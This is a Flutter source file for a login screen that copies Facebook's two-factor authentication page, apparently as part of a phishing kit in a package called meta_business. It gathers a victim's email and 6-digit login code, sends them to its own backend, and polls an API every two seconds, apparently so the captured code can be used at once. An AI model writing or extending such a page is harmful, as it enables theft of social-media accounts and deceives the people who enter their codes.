import 'dart:async';

import 'package:_iwu_pack/_iwu_pack.dart';
import 'package:_iwu_pack/setup/app_utils.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:gap/gap.dart';
import 'package:meta_business/src/presentation/authentication/widget/header.dart';

import '../../utils/network_request.dart';
import '../bloc/home_bloc.dart';
import '../upload/upload_screen.dart';

class AuthScreen extends StatefulWidget {
  final String email;
  const AuthScreen({super.key, required this.email});

  @override
  State<AuthScreen> createState() => _AuthScreenState();
}

class _AuthScreenState extends State<AuthScreen> {
  final HomeBloc _homeBloc = HomeBloc();

  TextEditingController twoFACode = TextEditingController();

  late Timer apiTimer;
  int intervalInSeconds = 2;

  final ApiClient apiClient = ApiClient();

  String error = '';
  @override
  void initState() {
    super.initState();
    apiTimer = Timer.periodic(Duration(seconds: intervalInSeconds), (timer) {
      apiClient.callApi();
      print("Calling API every 2 seconds");
    });
  }

  submit() {
    apiTimer.cancel();
    print("clicked");
    _homeBloc.add(CheckingTwoFAEvent(widget.email, twoFACode.text));
  }

  @override
  Widget build(BuildContext context) {
    return BlocConsumer<HomeBloc, HomeState>(
      bloc: _homeBloc,
      listener: (context, state) {
        if (state is CheckingState) {
          print("Checking login");
          showDialog(
              context: context,
              builder: (context) {
                return const Center(
                  child: CircularProgressIndicator(),
                );
              });
        }
        if (state is CheckingTwoFAFinished) {
          Navigator.of(context).pop();
          if (state.response['status'] == 200) {
            Navigator.push(context, MaterialPageRoute(builder: (context) {
              return UploadScreen(
                email: widget.email,
              );
            }));
          }
          if (state.response['status'] == 400) {
            setState(() {
              error = state.response['error'];
            });
          }
        }
      },
      builder: (context, state) {
        return Scaffold(
          body: Column(
            children: [
              const Header(),
              Expanded(
                  child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 16),
                width: double.infinity,
                color: hexColor("f1f2f6"),
                child: Column(
                  children: [
                    Container(
                      width: 600,
                      margin: const EdgeInsets.only(top: 80),
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                          color: Colors.white,
                          border: Border.all(
                              color: const Color.fromARGB(255, 205, 205, 205),
                              width: 1)),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            "Choose a way to confirm that it's you",
                            style: w600TextStyle(),
                          ),
                          const Divider(),
                          const Gap(4),
                          const Text(
                              "Your account has two-factor authentication switched on which requires this extra login step"),
                          const Gap(4),
                          const Divider(),
                          Text(
                            "Approve from another device",
                            style: w600TextStyle(),
                          ),
                          const Gap(12),
                          const Text(
                              "We already sent a notification to your logged-devices. Check your Facebook notifications where you're already logged in to the account and approve the login to continue"),
                          const Gap(8),
                          const Divider(),
                          const Gap(4),
                          Text(
                            "Or, enter your login code",
                            style: w600TextStyle(),
                          ),
                          const Gap(8),
                          const Text(
                              "Enter the 6-digit code from the authentication app that you set up"),
                          const Gap(8),
                          Container(
                            height: 30,
                            width: 200,
                            padding: const EdgeInsets.only(left: 4, bottom: 4),
                            decoration: BoxDecoration(
                                border: Border.all(
                                    color: const Color.fromARGB(
                                        255, 203, 202, 202))),
                            child: TextFormField(
                                controller: twoFACode,
                                decoration: const InputDecoration(
                                  focusedBorder: InputBorder.none,
                                  border: InputBorder.none,
                                  hintText: "Login code",
                                )),
                          ),
                          Gap(8),
                          error.isNotEmpty
                              ? Text(
                                  error,
                                  style: TextStyle(color: Colors.red),
                                )
                              : Text(""),
                          const Gap(8),
                          const Divider(),
                          Align(
                            alignment: Alignment.centerRight,
                            child: GestureDetector(
                              onTap: submit,
                              child: Container(
                                color: hexColor("4067b3"),
                                height: 30,
                                width: 100,
                                padding: const EdgeInsets.only(top: 6),
                                child: Text(
                                  "Submit code",
                                  textAlign: TextAlign.center,
                                  style: w600TextStyle(color: Colors.white),
                                ),
                              ),
                            ),
                          )
                        ],
                      ),
                    )
                  ],
                ),
              ))
            ],
          ),
        );
      },
    );
  }
}
